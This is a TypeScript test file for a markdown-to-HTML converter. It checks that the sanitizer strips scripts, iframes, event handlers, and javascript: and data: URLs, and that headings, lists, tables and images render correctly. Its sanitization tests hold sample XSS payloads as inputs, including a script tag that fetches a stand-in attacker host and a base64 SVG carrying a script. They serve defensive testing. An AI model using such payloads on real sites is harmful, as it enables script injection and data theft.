import { describe, it, expect } from "bun:test";
import { markdownToHtml } from "./markdown-html";
import type { RenderedImageRef } from "@brains/contracts";

describe("markdownToHtml sanitization", () => {
  it("strips inline <script> tags from markdown HTML passthrough", () => {
    const html = markdownToHtml(
      "Hello <script>fetch('http://attacker.example')</script> world",
    );
    expect(html).not.toContain("<script");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("Hello");
    expect(html).toContain("world");
  });

  it("strips <iframe> tags", () => {
    const html = markdownToHtml('Hi <iframe src="http://x"></iframe>');
    expect(html).not.toContain("<iframe");
  });

  it("drops inline event handler attributes", () => {
    const html = markdownToHtml('<a href="#" onclick="alert(1)">click</a>');
    expect(html).not.toContain("onclick");
    expect(html).toContain("href");
  });

  it("rejects javascript: and data: URLs on links", () => {
    const jsHtml = markdownToHtml("[bad](javascript:alert(1))");
    expect(jsHtml).not.toContain("javascript:");

    const dataHtml = markdownToHtml("[bad](data:text/html,<script>x</script>)");
    expect(dataHtml).not.toContain("data:text/html");
  });

  it("rejects data: URLs on images so SVG payloads cannot run scripts in Chromium", () => {
    const svgPayload =
      "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=";
    const html = markdownToHtml(`![bad](${svgPayload})`);
    expect(html).not.toContain("data:image/svg+xml");
    expect(html).not.toContain("base64");
  });

  it("preserves standard markdown output (headings, lists, links, code)", () => {
    const html = markdownToHtml(
      "# Title\n\n- a\n- b\n\n[link](https://example.com)\n\n`inline code`",
    );
    expect(html).toContain("<h1>Title</h1>");
    expect(html).toContain("<ul>");
    expect(html).toContain("<li>a</li>");
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain("<code>inline code</code>");
  });

  it("preserves blockquote-attribution cite/span post-processing", () => {
    const html = markdownToHtml("> quote\n\n— author");
    expect(html).toContain('<cite class="block-attribution">');
    expect(html).toContain('<span class="emdash">');
  });

  it("preserves code block language class for mermaid downstream handling", () => {
    const html = markdownToHtml("```mermaid\ngraph TD\nA-->B\n```");
    expect(html).toContain('class="language-mermaid"');
  });
});

describe("markdownToHtml rendering contract", () => {
  it("renders headings, hard and soft breaks, nested lists, quotes, rules, links, and code", () => {
    const html = markdownToHtml(
      '## Heading\n\nfirst\nsecond  \nthird\n\n> quote\n\n1. one\n   - nested\n2. two\n\n---\n\n[link](https://example.com "title")\n\n`<tag> &`',
    );

    expect(html).toContain("<h2>Heading</h2>");
    expect(html).toContain("<p>first<br />second<br />third</p>");
    expect(html).toContain("<blockquote>\n<p>quote</p>\n</blockquote>");
    expect(html).toContain("<li>one<ul>");
    expect(html).toContain("<li>nested</li>");
    expect(html).toContain("<hr />");
    expect(html).toContain(
      '<a href="https://example.com" title="title">link</a>',
    );
    expect(html).toContain("<code>&lt;tag&gt; &amp;</code>");
  });

  it("renders the supported GFM table, task-list, deletion, and autolink subset", () => {
    const html = markdownToHtml(
      "| a | b |\n| :- | -: |\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n~~gone~~ <https://example.com> user@example.com",
    );

    expect(html).toContain("<table>");
    expect(html).toContain('<th align="left">a</th>');
    expect(html).toContain('<td align="right">2</td>');
    expect(html).toContain("<li> done</li>");
    expect(html).toContain("<li> todo</li>");
    expect(html).toContain("<del>gone</del>");
    expect(html).toContain(
      '<a href="https://example.com">https://example.com</a>',
    );
    expect(html).toContain(
      '<a href="mailto:user@example.com">user@example.com</a>',
    );
  });

  it("preserves allowed raw HTML and entities while stripping attributes outside the allowlist", () => {
    const html = markdownToHtml(
      'before <em data-x="1">raw &amp; html</em> after\n\n<div onclick="x"><span>block</span></div>',
    );

    expect(html).toContain("<em>raw &amp; html</em>");
    expect(html).toContain("<div><span>block</span></div>");
    expect(html).not.toContain("data-x");
    expect(html).not.toContain("onclick");
  });

  it("passes renderer-neutral image arguments and sanitizes custom output", () => {
    const calls: RenderedImageRef[] = [];
    const html = markdownToHtml('![some *alt* &](entity:abc "image title")', {
      imageRenderer: (input) => {
        calls.push(input);
        return '<img src="https://example.com/image.png" alt="rewritten" width="100" onerror="alert(1)">';
      },
    });

    expect(calls).toEqual([
      {
        href: "entity:abc",
        alt: "some *alt* &",
        title: "image title",
      },
    ]);
    expect(html).toContain('src="https://example.com/image.png"');
    expect(html).toContain('alt="rewritten"');
    expect(html).toContain('width="100"');
    expect(html).not.toContain("onerror");
  });

  it("uses standard image rendering when the custom renderer returns undefined", () => {
    const calls: RenderedImageRef[] = [];
    const html = markdownToHtml('![fallback](entity:abc "image title")', {
      imageRenderer: (input) => {
        calls.push(input);
        return undefined;
      },
    });

    expect(calls).toEqual([
      {
        href: "entity:abc",
        alt: "fallback",
        title: "image title",
      },
    ]);
    expect(html).toContain(
      '<img src="entity:abc" alt="fallback" title="image title" />',
    );
  });
});
